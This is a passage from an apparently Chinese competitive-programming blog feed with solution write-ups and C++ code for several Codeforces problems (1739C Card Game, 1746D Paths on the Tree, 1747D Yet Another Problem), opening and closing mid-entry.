<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">1e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> size, p;</span><br><span class="line">    <span class="built_in">Node</span>(<span class="type">int</span> p) : <span class="built_in">p</span>(p) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">std::pair&lt;<span class="type">int</span>, std::vector&lt;<span class="type">int</span>&gt;&gt; e[MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">dfs1</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    e[p].first = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (e[p].second.<span class="built_in">size</span>() == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[p].second) e[p].first += <span class="built_in">dfs1</span>(each);</span><br><span class="line">    <span class="keyword">return</span> e[p].first;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span> &amp;&amp; p != n + <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p);</span><br><span class="line">    <span class="type">int</span> max = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[p].second) max = std::<span class="built_in">max</span>(max, e[each].first);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[p].second) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e[each].first != max) &#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(each);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> each : e[p].second) &#123;</span><br><span class="line">        <span class="keyword">if</span> (e[each].first == max) &#123;</span><br><span class="line">            <span class="built_in">dfs2</span>(each);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> b[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i]);</span><br><span class="line">        <span class="keyword">if</span> (b[i] &gt; i) k = i;</span><br><span class="line">        <span class="keyword">if</span> (b[i] == <span class="number">0</span>) flag = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n + <span class="number">1</span>; i++) e[i].second.<span class="built_in">clear</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) e[b[i]].second.<span class="built_in">push_back</span>(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        <span class="built_in">dfs1</span>(n + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">dfs2</span>(n + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">dfs1</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">dfs2</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>Codeforces</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1739C」Card Game - 组合数学 + 博弈论</title>
    <url>/cf-1739c/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/1739/C">Codeforces
链接</a></p>
<p>Alice 和 Bob 玩游戏，游戏中有 <span class="math inline">\(n\)</span>
张标有 <span class="math inline">\(1 \sim n\)</span> 数字卡牌（<span
class="math inline">\(n\)</span> 为偶数），开局时 Alice 和 Bob 均有
<span class="math inline">\(\frac{n}{2}\)</span>
张。在每一轮中，其中一人先打出自己一张卡牌，然后另一人再打出自己的一张卡牌。若后手无法打出比前一人打出卡牌数字大的卡牌，则后手输；否则进入下一轮。该轮的后手为下一轮的先手。若卡牌打完则平局。在这个游戏中，Alice
为第一轮的先手。假设双方均按最优策略出牌，求 Alice 赢、Bob
赢和平局的情况数。答案对 <span class="math inline">\(998244353\)</span>
取模。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>对于每一轮，我们显然可以得出：若先手有目前双方未打出的最大的牌，则先手打出这张牌必胜，否则后手可打出更大的牌结束该轮。于是我们只考虑最大的牌和次大的牌，分别分情况讨论：</p>
<ol type="1">
<li>先手拥有最大的牌，则先手必胜；</li>
<li>后手同时拥有最大的牌和次大的牌，则先手必输；</li>
<li>先手拥有次大的牌，后手拥有最大的牌，此时的最优策略是先手打掉次大的牌，后手打掉最大的牌，进入下一轮。</li>
</ol>
<p>对于每一种情况，我们用组合数学求出即可。我们存储 Alice 和 Bob
赢的情况，将 <span class="math inline">\(n\)</span>
从大到小两两一组讨论，假设最大牌为 <span
class="math inline">\(i\)</span>：</p>
<ol type="1">
<li>对于情况 <span class="math inline">\(1\)</span>，先手获胜情况数加
<span class="math inline">\({i - 1 \choose \frac{n}{2} - 1 - \frac{n -
i}{2}}\)</span>，即先手的剩下的卡牌为在 <span class="math inline">\(i -
1\)</span> 个数中选择的情况数；</li>
<li>对于情况 <span class="math inline">\(2\)</span>，后手获胜情况数加
<span class="math inline">\({i - 2 \choose \frac{n}{2} - \frac{n -
i}{2}}\)</span>，即后手的剩下的卡牌在 <span class="math inline">\(i -
2\)</span> 个数中选择的情况数。</li>
</ol>
<p>每讨论完一组就换先手继续讨论。平局的情况数显然为 <span
class="math inline">\(1\)</span>，这样我们就可以得出获胜的情况数了。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">60</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MOD = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> fac[MAXN + <span class="number">1</span>], inv[MAXN + <span class="number">1</span>], facInv[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">int</span> <span class="title">C</span><span class="params">(<span class="type">const</span> <span class="type">int</span> n, <span class="type">const</span> <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (k &lt; <span class="number">0</span> || k &gt; n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (k == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> fac[n] * facInv[k] % MOD * facInv[n - k] % MOD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">long</span> <span class="type">long</span> <span class="title">lucas</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n, <span class="type">long</span> <span class="type">long</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!k) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">C</span>(n % MOD, k % MOD) * <span class="built_in">lucas</span>(n / MOD, k / MOD) % MOD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">prepare</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    fac[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) fac[i] = fac[i - <span class="number">1</span>] * i % MOD;</span><br><span class="line"></span><br><span class="line">    inv[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= MAXN; i++) inv[i] = ((-(MOD / i) * inv[MOD % i]) % MOD + MOD) % MOD;</span><br><span class="line"></span><br><span class="line">    facInv[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= MAXN; i++) facInv[i] = facInv[i - <span class="number">1</span>] * inv[i] % MOD;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans1 = <span class="number">0</span>, ans2 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt;= <span class="number">1</span>; i -= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            ans1 = (ans1 + <span class="built_in">lucas</span>(i - <span class="number">1</span>, n / <span class="number">2</span> - <span class="number">1</span> - (n - i) / <span class="number">2</span>)) % MOD;</span><br><span class="line">            ans2 = (ans2 + <span class="built_in">lucas</span>(i - <span class="number">2</span>, n / <span class="number">2</span> - (n - i) / <span class="number">2</span>)) % MOD;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ans2 = (ans2 + <span class="built_in">lucas</span>(i - <span class="number">1</span>, n / <span class="number">2</span> - <span class="number">1</span> - (n - i) / <span class="number">2</span>)) % MOD;</span><br><span class="line">            ans1 = (ans1 + <span class="built_in">lucas</span>(i - <span class="number">2</span>, n / <span class="number">2</span> - (n - i) / <span class="number">2</span>)) % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        flag ^= <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld %lld 1\n&quot;</span>, ans1, ans2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">prepare</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>数学</tag>
        <tag>博弈论</tag>
        <tag>Codeforces</tag>
        <tag>组合数学</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1746D」Paths on the Tree - 贪心</title>
    <url>/cf-1746d/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/1746/D">Codeforces
链接</a></p>
<p>给定一个 <span class="math inline">\(n\)</span>
个节点的树，其节点被标记为 <span class="math inline">\(1\)</span> 到
<span class="math inline">\(n\)</span>，而且该树的根为 <span
class="math inline">\(1\)</span>，另外也给定一个积分序列 <span
class="math inline">\(s\)</span></p>
<p>如果下列两个条件都满足，则我们称路径集合k可用：</p>
<ul>
<li><p>该集合内所有路径从 <span class="math inline">\(1\)</span>
开始</p></li>
<li><p><span class="math inline">\(c_i\)</span> 为覆盖节点 <span
class="math inline">\(i\)</span>
的路径数量，对于每对拥有同个父节点的节点 <span
class="math inline">\((u,v)\)</span>，要求<span
class="math inline">\(|c_u-c_v|\)</span> 小于等于1</p></li>
</ul>
<p>对于每个路径集合，其权值被定义为 <span
class="math inline">\(\sum\limits_{i=1}^n{c_i s_i}\)</span></p>
<p>显而易见，每组数据至少有一个可用的路径集合，找出所有可用路径集合中的最大权值</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然为了让答案最大，每条路径都会走到叶子节点。于是我们可以考虑每条路径对每一层的影响。显然对于度为
<span class="math inline">\(a\)</span> 的节点 <span
class="math inline">\(u\)</span> 被覆盖 <span
class="math inline">\(k\)</span> 次，每个节点要么被覆盖 <span
class="math inline">\(\lfloor \frac{k}{a} \rfloor\)</span>
次，要么被覆盖 <span class="math inline">\(\lfloor \frac{k}{a} \rfloor +
1\)</span> 次，且被被覆盖 <span class="math inline">\(\lfloor
\frac{k}{a} \rfloor + 1\)</span> 次的节点有 <span
class="math inline">\(k \bmod a\)</span> 个。于是我们可以先将每个点覆盖
<span class="math inline">\(\lfloor \frac{k}{a} \rfloor\)</span>
次。接下来再处理被覆盖 <span class="math inline">\(\lfloor \frac{k}{a}
\rfloor + 1\)</span> 次的情况。</p>
<p>处理被覆盖 <span class="math inline">\(\lfloor \frac{k}{a} \rfloor +
1\)</span> 次的情况时，我们可以从从叶子到根的方向考虑。我们直接进行 DFS
寻找剩余路径。显然对于边 <span class="math inline">\(u \rightarrow
v\)</span>，到达 <span class="math inline">\(v\)</span>
的路径中只有一条对 <span class="math inline">\(u\)</span>
有效，为使答案最大，我们取权值最大的一条路径，其余的路径到 <span
class="math inline">\(u\)</span> 就截止了，记录进答案即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;Node *&gt; adj;</span><br><span class="line">    <span class="type">int</span> deg, remain;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> s;</span><br><span class="line">    std::priority_queue&lt;<span class="type">long</span> <span class="type">long</span>&gt; q;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *u, Node *v)</span> </span>&#123;</span><br><span class="line">    u-&gt;adj.<span class="built_in">push_back</span>(v);</span><br><span class="line">    u-&gt;deg++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs1</span><span class="params">(Node *u, <span class="type">long</span> <span class="type">long</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!u-&gt;adj.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> size = u-&gt;adj.<span class="built_in">size</span>();</span><br><span class="line">        ans += k / size * size * u-&gt;s;</span><br><span class="line">        <span class="keyword">for</span> (Node *v : u-&gt;adj) <span class="built_in">dfs1</span>(v, k / size);</span><br><span class="line">        u-&gt;remain = k % size;</span><br><span class="line">    &#125; <span class="keyword">else</span> ans += k * u-&gt;s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs2</span><span class="params">(Node *u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u-&gt;deg == <span class="number">0</span>) u-&gt;q.<span class="built_in">push</span>(u-&gt;s);</span><br><span class="line">    <span class="keyword">for</span> (Node *v : u-&gt;adj) &#123;</span><br><span class="line">        <span class="built_in">dfs2</span>(v);</span><br><span class="line">        <span class="keyword">if</span> (!v-&gt;q.<span class="built_in">empty</span>()) u-&gt;q.<span class="built_in">push</span>(v-&gt;q.<span class="built_in">top</span>() + u-&gt;s);</span><br><span class="line">        <span class="keyword">while</span> (!v-&gt;q.<span class="built_in">empty</span>()) v-&gt;q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (u-&gt;remain--) &#123;</span><br><span class="line">        ans += u-&gt;q.<span class="built_in">top</span>();</span><br><span class="line">        u-&gt;q.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="function">std::vector&lt;Node&gt; <span class="title">nodes</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="type">int</span> p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;p);</span><br><span class="line">        <span class="built_in">addEdge</span>(&amp;nodes[--p], &amp;nodes[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;nodes[i].s);</span><br><span class="line"></span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">dfs1</span>(&amp;nodes[<span class="number">0</span>], k);</span><br><span class="line">    <span class="built_in">dfs2</span>(&amp;nodes[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>Codeforces</tag>
        <tag>树</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 1747D」Yet Another Problem - 构造 + 二分</title>
    <url>/cf-1747d/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://codeforces.com/problemset/problem/1747/D">Codeforces
链接</a></p>
<p>你有一个长度为 <span class="math inline">\(n (1 \le n \le 2 \times
10^5)\)</span> 的整数序列 <span class="math inline">\(a\)</span>。</p>
<p>你需要回答 <span class="math inline">\(q (1 \le q \le 2 \times
10^5)\)</span> 个独立的问题，每次询问如下：</p>
<p>给定 <span class="math inline">\(l\)</span> 和 <span
class="math inline">\(r\)</span>，你可以对序列做若干次操作（也可以不做），每次操作，你需要选择两个数
<span class="math inline">\(L\)</span> 与 <span
class="math inline">\(R\)</span>，其中必须满足 <span
class="math inline">\(l\le L\le R\le r\)</span> 且 <span
class="math inline">\(R-L+1\)</span> 为奇数。然后将 <span
class="math inline">\(a_L\sim a_R\)</span> 的所有数改为 <span
class="math inline">\(a_L\sim a_R\)</span> 的异或和，即 <span
class="math inline">\(a_L\oplus a_{L+1}\oplus \sim \oplus
a_R\)</span>。</p>
<p>你的目标是将 <span class="math inline">\(a_l\sim a_r\)</span>
的所有数变为 <span
class="math inline">\(0\)</span>。每次询问完后，序列复原。</p>
<p>询问的答案即为最小操作数。如果总是不能达到目标，则答案为 <span
class="math inline">\(-1\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>首先我们分析询问。通过异或的性质，我们很容易得出：在询问 <span
class="math inline">\([l, r]\)</span> 中，当 <span
class="math inline">\(\oplus_{i = l}^{r}a_{i} \ne 0\)</span>
时无解。否则会进行下列情况：</p>
<ul>
<li>当 <span class="math inline">\(\forall a_i = 0 (i \in [l,
r])\)</span> 时：显然操作数为 <span
class="math inline">\(0\)</span>。</li>
<li>当 <span class="math inline">\(r - l + 1\)</span>
为奇数时：此时只需要进行 <span class="math inline">\(l \rightarrow
r\)</span> 一次操作即可将整个区间变为 <span
class="math inline">\(0\)</span>，即操作数为 <span
class="math inline">\(1\)</span>。</li>
<li>当 <span class="math inline">\(r - l + 1\)</span>
为偶数时，需要分下列两种情况讨论：
<ul>
<li>当 <span class="math inline">\(a_l = 0 \vee a_r = 0\)</span>
时：去掉 <span class="math inline">\(a_l\)</span> 或 <span
class="math inline">\(a_r\)</span> 可变为奇数情况，故操作数为 <span
class="math inline">\(1\)</span>。</li>
<li>当该区间可被分为两个奇数长度的区间（且这两个区间的异或和均为 <span
class="math inline">\(0\)</span>）时：分别将这两个化为 <span
class="math inline">\(0\)</span>，显然操作数为 <span
class="math inline">\(2\)</span>。</li>
<li>其余情况：由于只能选择奇数长度的段，于是无论如何都选择不出异或和为
<span class="math inline">\(0\)</span> 的段，导致无法将区间化为 <span
class="math inline">\(0\)</span>。于是无解。</li>
</ul></li>
</ul>
<p>于是我们只需要预处理出异或前缀和 <span
class="math inline">\(\text{res}\)</span>，<span
class="math inline">\(a_i\)</span> 中 <span
class="math inline">\(0\)</span> 的个数 <span
class="math inline">\(\text{cnt0}\)</span>
和每个异或前缀和所对应的坐标集合 <span class="math inline">\(f_{0 / 1,
m}\)</span>（第一维中 <span class="math inline">\(0\)</span>
表示偶数坐标，<span class="math inline">\(1\)</span>
表示奇数坐标），然后查询即可。</p>
<ul>
<li>首先判断 <span class="math inline">\(\text{cnt0}_r - \text{cnt0}_{l
- 1}\)</span> 是否等于 <span class="math inline">\(r - l +
1\)</span>。</li>
<li>然后判断 <span class="math inline">\(\text{res}_{l - 1}\)</span>
是否等于 <span class="math inline">\(\text{res}_{r}\)</span>。</li>
<li>当 <span class="math inline">\(r - l + 1\)</span>
为奇数时：直接得出答案。</li>
<li>当 <span class="math inline">\(r - l + 1\)</span> 为偶数时：对 <span
class="math inline">\(f_{l \bmod 2, \text{res}_{l - 1}}\)</span>
二分求出大于 <span class="math inline">\(l\)</span>
的最小坐标。若该坐标小于 <span
class="math inline">\(r\)</span>，则说明可将该区间分割，答案为 <span
class="math inline">\(2\)</span>，否则无解。</li>
</ul>
<p>时间复杂度为 <span class="math inline">\(O(n \log n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n, q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;q);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">a</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">res</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) res[i] = res[i - <span class="number">1</span>] ^ a[i];</span><br><span class="line"></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">cnt0</span><span class="params">(n + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) cnt0[i] = cnt0[i - <span class="number">1</span>] + (a[i] == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    std::map&lt;<span class="type">int</span>, std::vector&lt;<span class="type">int</span>&gt;&gt; f[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) f[i % <span class="number">2</span>][res[i]].<span class="built_in">push_back</span>(i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (q--) &#123;</span><br><span class="line">        <span class="type">int</span> l, r;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;l, &amp;r);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cnt0[r] - cnt0[l - <span class="number">1</span>] == r - l + <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (res[l - <span class="number">1</span>] != res[r]) <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((r - l + <span class="number">1</span>) % <span class="number">2</span> || a[l] == <span class="number">0</span> || a[r] == <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">auto</span> p = std::<span class="built_in">upper_bound</span>(f[l % <span class="number">2</span>][res[l - <span class="number">1</span>]].<span class="built_in">begin</span>(), f[l % <span class="number">2</span>][res[l - <span class="number">1</span>]].<span class="built_in">end</span>(), l);</span><br><span class="line">            <span class="keyword">if</span> (p != f[l % <span class="number">2</span>][res[l - <span class="number">1</span>]].<span class="built_in">end</span>() &amp;&amp; *p &lt; r) <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>Codeforces</tag>
        <tag>构造</tag>
        <tag>二分</tag>
      </tags>
  </entry>
  <entry>
    <title>「Codeforces 219D」Choosing Capital for Treeland - 树形 DP</title>
    <url>/cf-219d/</url>
    <content><![CDATA[<h1 id="题目描述">题目描述</h1>
<p><a href="https://codeforces.com/problemset/problem/219/D">Codeforces
链接</a></p>
<p>Treeland 国有 <span class="math inline">\(n\)</span> 个城市，这 <span
